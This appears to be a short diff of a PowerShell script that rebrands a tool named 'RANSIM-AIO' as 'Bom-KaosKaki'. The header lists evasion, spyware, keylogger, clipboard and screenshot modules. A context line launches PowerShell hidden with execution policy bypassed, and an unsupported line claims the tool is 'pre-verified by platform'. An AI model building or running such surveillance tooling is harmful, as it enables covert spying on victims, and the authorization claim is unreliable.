@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-  RANSIM-AIO v3.0 — All-in-One Penetration Testing Suite
+  Bom-KaosKaki v3.0 — All-in-One Penetration Testing Suite
   Authorized use only. Pre-verified by platform.
 .DESCRIPTION
   Modules: Evasion, Spyware, Keylogger, Clipboard, Screenshot,
@@ -1147,7 +1147,7 @@ WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "
 
 # ========== MAIN EXECUTION ==========
 function Invoke-Main {
-    Write-Log "=== RANSIM-AIO v3.0 Starting ==="
+    Write-Log "=== Bom-KaosKaki v3.0 Starting ==="
     Write-Log "Session: $SESSION_ID | Machine: $MACHINE_ID"
   
     # Always run evasion first
